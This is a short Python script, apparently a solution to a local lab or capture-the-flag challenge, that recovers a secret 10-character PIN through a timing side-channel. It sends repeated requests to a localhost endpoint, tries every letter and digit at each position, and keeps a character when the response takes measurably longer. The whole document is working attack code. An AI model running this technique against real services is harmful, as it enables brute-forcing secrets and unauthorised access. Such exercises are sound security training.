import requests
import string

pin = [ "1", "2", "3", "4", "5", "6", "7", "8", "9", "0" ]

curr_idx = 0

while curr_idx < len(pin):

    for c in (string.ascii_letters + string.digits):

        # print ("c:", c)

        pin[curr_idx] = c

        r = requests.get(f"http://127.0.0.1:8000/challenges/08?pin={''.join(pin)}")

        # print (r.elapsed.total_seconds())

        if r.elapsed.total_seconds() - (0.09 * curr_idx) >= 0.09:
            curr_idx += 1
            break

    # print ("curr_idx:", curr_idx)
    print ("pin:", "".join(pin))

print ("Here's the secret PIN:", "".join(pin))